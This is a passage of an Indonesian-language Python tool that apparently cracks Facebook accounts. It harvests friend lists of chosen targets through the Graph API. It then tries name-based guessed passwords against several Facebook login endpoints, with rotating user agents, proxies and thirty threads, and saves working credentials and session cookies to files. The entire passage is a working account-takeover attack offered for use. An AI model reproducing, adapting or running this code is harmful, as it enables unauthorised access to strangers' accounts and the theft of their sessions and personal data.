,'dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko']
	blk = ['boy','wawanda','eam','aulia','kasih','cantik','kucing','karin','tzy','1','2','3','4','5','6','7','8','9','99','official','gaming','utama','123','1234','12345','123456','cakep']
	global ok , cp
	cetak(panel(f'{P}SILAKAN MASUKAN NAMA SECARA RANDOM{P}',width=70,padding=(0,7),style=f"bold green")) 
	nama = input('[+] Username : ')
	if ',' in str(nama):
		exit(f'[+] masukan 1 nama saja')
	doma = '@gmail.com'
	if '@' not in str(doma) or '.com' not in str(doma):
		exit(f'[+] masukan domain yang benar')
	jumlah = input('[+] Masukan total : ')
	for xyz in range(int(jumlah)):
		A = nama
		B = [f'{str(rc(bas))}',f'{str(rr(0,31))}',f'{str(rc(blk))}'f'{str(rc(bas))}{str(rr(0,31))}',f'{xyz}',f'{str(rc(blk))}{str(rr(0,31))}',f'{str(rc(bas))}{str(rc(blk))}']
		C = doma
		D = f'{A}{str(rc(B))}{C}'
		if D in id:pass
		else:id.append(D+'|'+nama)
		if len(id)==1010101010101010101:setting()
	setting()
def login1():
    clear();banner();cetak(panel(f"[white]Login Menggunakan Cookies Facebook",width=90,padding=(0,7),style=f"bold green")) 
    cookie = input('Cookies : ')
    token_eaab = generate_token_eaab(cookie)
    print('\n Token Kamu : %s'%(token_eaab))
    tokenw = open(".tonken.txt", "w").write(token_eaab)
    cokiew = open(".coonk.txt", "w").write(cookie)
    print("\nSelamat sukses login");exit()
def generate_token_eaab(cok):
    r = requests.Session()
    req1 = r.get('https://www.facebook.com/adsmanager/manage/campaigns',cookies={'cookie':cok},allow_redirects=True).text
    nek1 = re.search('window\.location\.replace\("(.*?)"\)',str(req1)).group(1).replace('\\','')
    req2 = r.get(nek1,cookies={'cookie':cok},allow_redirects=True).text
    tok  = re.search('accessToken="(.*?)"',str(req2)).group(1)
    return(tok)
#╭∩╮(︶.︶メ)[ /-MENU -\](︶.︶メ)╭∩╮#
def menu(idff,namaff):
	try:token = open('.tonken.txt','r').read();cok = open('.coonk.txt','r').read()
	except IOError:print(f'{P}Expired Cookies{x} ');time.sleep(3);login1()
	ip = requests.get("https://api.ipify.org").text
	os.system('clear');banner();cetak(panel(f"[bold white]NAMA : [bold green]{namaff}\n[bold white]ID   : [bold green]{idff}\n[bold white]IP   : [bold green]{ip}",width=38,style=f"bold green"))
	cetak(nel(f"[bold white][[bold yellow]01[bold white]][bold yellow]. PILIH[bold green] Crack dari Massal\n[bold white][[bold yellow]02[bold white]][bold yellow]. PILIH[bold green] Crack dari Publik\n[bold white][[bold yellow]03[bold white]][bold yellow]. PILIH[bold green] Crack dari Email\n[bold white][[bold yellow]04[bold white]][bold yellow]. PILIH[bold green] Crack dari File\n[bold white][[bold yellow]05[bold white]][bold yellow]. PILIH[bold green] Check Result\n[bold white][[bold yellow]00[bold white]][bold yellow]. PILIH[bold green] hubungi - admin",width=70,style=f"bold green"))
	_____hadixd__hadix_____ = input('Pilih : ')
	if _____hadixd__hadix_____ in ['1','01']:Dump_Publik()
	elif _____hadixd__hadix_____ in ['2','02']:dumpxd()
	elif _____hadixd__hadix_____ in ['05','5']:result()
	elif _____hadixd__hadix_____ in ['3','03']:crack_email()
	elif _____hadixd__hadix_____ in ['4','04']:crack_file()
	elif _____hadixd__hadix_____ in ['0','00']:os.system('rm -rf .tonken.txt');os.system('rm -rf .coonk.txt');print('Sukses Logout - Good By Sampai jumpa');exit()
		
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	cetak(nel(f'[bold white][[bold yellow]01[bold white]][bold green]. Cek Hasil OK\n[bold white][[bold yellow]02[bold white]][bold blue]. Cek Hasil CP',width=90,title=f"[bold blue]List Menu Cek",style=f"bold green"))
	kz = input(f'[•] Pilih : ')
	if kz in ['2','02']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print(f'{k}file Tidak Di Temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print(' Anda Tidak Memiliki Hasil CP ')
			time.sleep(4)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' ACCOUNT ]'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' ACCOUNT ]'+x)
			geeh = input(f'\n{P}{x}{H} {x}{P}{x} {P}Select{x} : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' Pilih Yang Bener Kontol ')
				back()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('File Tidak Di Temukan ')
				time.sleep(4)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="yellow"))
				nocp +=1
			input('[ Klik Enter ]')
			back()
	elif kz in ['1','01']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print(' File Tidak Di Temukan ')
			time.sleep(4)
			back()
		if len(vin)==0:
			print('Anda Tidak Mempunyai File OK ')
			time.sleep(4)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<80:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input('\nPilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' Pilih Yang Bener Kontol ')
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('File Tidak Di Temukan ')
				time.sleep(4)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# ID: {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="green"))
				print(f'{hh}Cookie: {x}{cpkuni[2]}')
				nocp +=1
			input('[ Klik Enter ]')
			back()
	elif kz in ['3','03']:
		menu()
	else:
		print('Pilih Yang Bener Kontol ')
		exit()
	
def crack_file():
	try:vin = os.listdir('/sdcard/DUMP-FILE/')
	except FileNotFoundError:
		print(' [+] File Tidak Ditemukan ')
		time.sleep(2)
		exit()
	if len(vin)==0:
		print(' [+] Kamu Tidak Memiliki File Dump ')
		time.sleep(2)
		exit()
	else:
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('/sdcard/DUMP-FILE/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f' %s. %s [ %s Idz ]'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				print(' [+] %s. %s [ %s Idz] '%(cih,isi,len(hem)))
		geeh = input(' [+] Pilih : ')
		try:geh = lol[geeh]
		except KeyError:
			print(f' [+] Pilih Yang Bener Kontol ')
			time.sleep(3)
			exit()
		try:lin = open('/sdcard/DUMP-FILE/'+geh,'r').read().splitlines()
		except:
			print(' [+] File Tidak Ditemukan, Coba Lagi Nanti ')
			time.sleep(2)
			exit()
		for xid in lin:
			id.append(xid)
		setting()

def dumpxd():
    uid = []
    tok = open('.tonken.txt','r').read()
    cok = open('.coonk.txt','r').read()
    lid = input('Masukan target: ').split(',')
    for usrr in lid:
        try:
            r = requests.Session()
            url = f'https://graph.facebook.com/v12.0/{usrr}/friends'
            LoopDump(r, cok, tok, url, id, None)
        except KeyboardInterrupt: pass
        except Exception as e: pass
        print(f"\r")
    setting()
def LoopDump(r, cok, tok, url, id, after):
    try:
        dta = {'access_token':tok,'after':after,'pretty':'1'}
        req = r.get(url,params=dta,cookies={'cookies':cok}).json()
        if 'temporarily blocked' in str(req):
            print('Silakan ganti Cokiess')
            exit('')
        for d in req['data']:
            try:
                woy = (d['id']+'|'+d['name'])
                if woy in id:pass
                else:id.append(woy)
            except Exception as e: continue
        after = req['paging']['cursors']['after']
        LoopDump(r,cok,tok,url,id,after)
    except KeyboardInterrupt: pass
    except Exception as e: pass	

	
def Dump_Publik():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
	    exit()
	try:
		kumpulkan = int(input(f'{P}[{H}+{P}] Mau Berapa ID : {H}'))
	except ValueError:
	    exit()
	if kumpulkan<1 or kumpulkan>1000:
	    exit()
	ses=requests.Session()
	bilangan = 0
	for KOTG49H in range(kumpulkan):
		bilangan+=1
		Masukan = input(f'{P}[{H}+{P}] Masukan Id Yang Ke  '+str(bilangan)+f' :{H} ')
		uid.append(Masukan)
	for user in uid:
	    try:
	       head = (
	       {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
	       })
	       if len(id) == 0:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	          
	       )
	       else:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	           
	       )
	       url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
	       for xr in url['friends']['data']:
	           try:
	               woy = (xr['id']+'|'+xr['name'])
	               if woy in id:pass
	               else:id.append(woy)
	           except:continue
	    except (KeyError,IOError):
	      pass
	    except requests.exceptions.ConnectionError:
	        exit()
	try:
	      print(f"{P}[{H}+{P}] Total DUMP  : {H}"+str(len(id))) 
	      setting()
	except requests.exceptions.ConnectionError:
	    exit()
	except (KeyError,IOError):
		exit()

#-------------[ CRACK-FROM-FILE ]------------------#
def crack_file():
	try:vin = os.listdir('/sdcard/DUMP')
	except FileNotFoundError:
		print('File Tidak Ditemukan ')
		time.sleep(2)
		back()
	if len(vin)==0:
		print('Kamu Tidak Memiliki File Dump ')
		time.sleep(2)
		back()
	else:
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('/sdcard/DUMP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f'>> %s. %s ({h} %s{x} idz )'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				print(' %s. %s ({h} %s {x}idz) '%(cih,isi,len(hem)))
		geeh = input('\nPilih : ')
		try:geh = lol[geeh]
		except KeyError:
			print(f'{k}Pilih Yang Bener Bro {x}')
			time.sleep(3)
			back()
		try:lin = open('/sdcard/DUMP/'+geh,'r').read().splitlines()
		except:
			print('File Tidak Ditemukan, Coba Lagi Nanti ')
			time.sleep(2)
			back()
		for xid in lin:
			id.append(xid)
		setting()
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	cetak(nel(f"[bold white][[bold yellow]01[bold white]][bold green] ID OLD\n[bold white][[bold yellow]02[bold white]][bold green] ID NEW\n[bold white][[bold yellow]03[bold white]][bold green] ID RANDOM",width=70,style=f"bold green",title=f"[bold white]Total : "+str(len(id))))
	hu = input('>> Pilih : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print(' Pilih Yang Bener Sayang ')
		exit()
	cetak(nel(f"[bold white][[bold yellow]01[bold white]][bold green]. Mobile\n[bold white][[bold yellow]02[bold white]].[bold green] Mbasic\n[bold white][[bold yellow]03[bold white]].[bold green] Validate\n[bold white][[bold yellow]04[bold white]].[bold green] B-Api",width=70,style=f"bold green",title=f"[bold white] Metode Crack"))
	hc = input('>> Pilih : ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['2','02']:
		method.append('touch')
	elif hc in ['4','04']:
		method.append('free')
	elif hc in ['3','03']:
		method.append('mbasic')
	else:
		method.append('mobile')
	cetak(nel(f"[bold green]Tambahkan Password Manual [bold red] Not Recomend",width=70,style=f"bold green"))
	pwplus=input('PILIH : ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('[[cyan]•[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[cyan]•[white]] Contoh :[green] Hadi123,budisabah,akusayang123[white] '))
		pwku=input('Masukkan Password Tambahan : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	cetak(nel(f"[bold yellow]CP[bold white] RESULT CP TERSIMPAN DI FOLDER [bold yellow]CP/{cpc}\n[bold green]OK[bold white] RESULT OK TERSIMPAN DI FOLDER [bold green] OK/{okc}",width=70,style=f"bold green",subtitle=f"Mainkan Mode pesawat setiap 400 ID",title=f"[bold white]Informasi"))
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append('rido123')
					pwv.append('rido1234')
					pwv.append(frs+'12345')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append('sayang123')
					pwv.append('sayang1234')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'touch' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'free' in method:
				pool.submit(cracktouch,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	cetak(nel(f"[bold white]Sukses Crack {loop} ID Dengan Hasil {H}OK : {ok} {K}CP : {cp}",width=90,style=f"bold green"));exit()
#------------------[ METHODE-MBASIC-2 ]-------------------#
def crackfree(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r{P}[{B} Mbasic {P}] [{M}{loop}{P}/{U}{len(id)}{P}] {P}[{H}{ok}{P}] [{M}{cp}{P}] {'{:.0%}'.format(loop/float(len(id)))}{P} "),   #   THANKS  = PRA-XD          #
	sys.stdout.flush()
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({
				'Host': 'free.facebook.com',
				'cache-control': 'max-age=0',
				'sec-ch-ua-mobile': '?1',
				'upgrade-insecure-requests': '1',
				'user-agent': ua,
				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
				'sec-fetch-site': 'same-origin',
				'sec-fetch-mode': 'cors',
				'sec-fetch-dest': 'empty',
				'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
				})
			p = ses.get('https://free.facebook.com/login.php?skip_api_login=1&api_key=322819995959411&kid_directed_site=0&app_id=322819995959411&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fclient_id%3D322819995959411%26redirect_uri%3Dhttps%253A%252F%252Finfoday.sydney.edu.au%252Fstudents%252Ffacebook%252Flogin%252Fcallback%252F%26scope%3Demail%252Cpublic_profile%26response_type%3Dcode%26state%3DQtlRdctEkORX%26auth_type%3Drerequest%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D78c8f4d8-882a-42da-91b8-041d5c952e01%26tp%3Dunspecified&cancel_url=https%3A%2F%2Finfoday.sydney.edu.au%2Fstudents%2Ffacebook%2Flogin%2Fcallback%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DQtlRdctEkORX%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={
				"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
				"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
				"uid":idf,
				"next":"https://free.facebook.com/v13.0/dialog/oauth?client_id=322819995959411&redirect_uri=https%3A%2F%2Finfoday.sydney.edu.au%2Fstudents%2Ffacebook%2Flogin%2Fcallback%2F&scope=email%2Cpublic_profile&response_type=code&state=QtlRdctEkORX&auth_type=rerequest&ret=login&fbapp_pres=0&logger_id=78c8f4d8-882a-42da-91b8-041d5c952e01&tp=unspecified",
				"flow":"login_no_pin",
				"pass":pw,
				}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={
				'Host': 'free.facebook.com',
				'cache-control': 'max-age=0',
				'sec-ch-ua': '"Not A;Brand";v="99", "Chromium";v="98"',
				'sec-ch-ua-mobile': '?1',
				'sec-ch-ua-platform': '"Android"',
				'upgrade-insecure-requests': '1',
				'origin': 'https://free.facebook.com',
				'content-type': 'application/x-www-form-urlencoded',
				'user-agent': ua,
				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
				'x-requested-with': 'XMLHttpRequest',
				'sec-fetch-site': 'same-origin',
				'sec-fetch-mode': 'cors',
				'sec-fetch-dest': 'empty',
				'referer': 'https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Ffree.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fclient_id%3D322819995959411%26redirect_uri%3Dhttps%253A%252F%252Finfoday.sydney.edu.au%252Fstudents%252Ffacebook%252Flogin%252Fcallback%252F%26scope%3Demail%252Cpublic_profile%26response_type%3Dcode%26state%3DQtlRdctEkORX%26auth_type%3Drerequest%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D78c8f4d8-882a-42da-91b8-041d5c952e01%26tp%3Dunspecified&cancel_url=https%3A%2F%2Finfoday.sydney.edu.au%2Fstudents%2Ffacebook%2Flogin%2Fcallback%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DQtlRdctEkORX%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
				'accept-encoding': 'gzip, deflate, br',
				'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
					}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree("    ")

				tree.add(f"{K}Chekpoint").add(f"{K}{idf}|{pw}")

				tree.add(f"{U}{ua}{P}")
				cetak(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree("   ")

				tree.add(f"{H}Sukses-Masuk").add(f"{H}{idf}|{pw}")

				tree.add(f"{H}{kuki}{P}")
				tree.add(f"{U}{ua}{P}")
				cetak(tree)
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1			
###---------------------[ Mbasic ]---------------------###
def crackmbasic(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r{P}[{B} Validate V2{P}] [{M}{loop}{P}/{U}{len(id)}{P}] {P}[{H}{ok}{P}] [{M}{cp}{P}] {'{:.0%}'.format(loop/float(len(id)))}{P} "),   #   THANKS  = PRA-XD         #
	sys.stdout.flush()
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({"Host": "touch.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Chromium";v="107", "Not=A?Brand";v="24"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-dest": "document","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get("https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8")
			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': 'browser_dropdown', 'prefill_type': 'password', 'first_prefill_source': 'browser_dropdown', 'first_prefill_type': 'contact_point', 'had_cp_prefilled': 'true', 'had_password_prefilled': 'true', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.15625; wd=501x950'
			heade={
			"Host": "touch.facebook.com",
			"content-length": f"{len(str(dataa))}",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			"origin": "https://touch.facebook.com",
			"content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "*/*",
			"x-requested-with": "com.microsoft.bing",
			"sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
			"sec-ch-ua-platform": '"Android"',
			"sec-ch-ua-mobile": "?1",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"sec-fetch-user": "?1",
			"referer": "https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
			"accept-encoding": "gzip, deflate, br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			}
			po = ses.post('https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree("    ")

				tree.add(f"{K}Chekpoint").add(f"{K}{idf}|{pw}")

				tree.add(f"{U}{ua}{P}")
				cetak(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree("   ")

				tree.add(f"{H}Sukses-Masuk").add(f"{H}{idf}|{pw}")

				tree.add(f"{H}{kuki}{P}")
				tree.add(f"{U}{ua}{P}")
				cetak(tree)
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1		
#---------------------[ METHODE-TOUCH-3 ]---------------------#
def cracktouch(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r{H}B-Api {b}{loop}{P}/{u}{len(id)}{H} OK : {ok} {K}CP : {cp} {bo}{'{:.0%}'.format(loop/float(len(id)))}"),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			link = ses.get('https://m.prod.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'm.prod.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v12.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'Cx4jrkJJire','x-fb-rev': '1007127514','x-fb-debug': 'AXRLN2ab6tbNBxFWS6kiERe8mEyeHkpYgc1xM77joSCak8hY1B2+tWfeptUXVmRpMqno2j95r13+cw0bLoOi4A==','content-length': '2141','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.prod.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://m.prod.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54b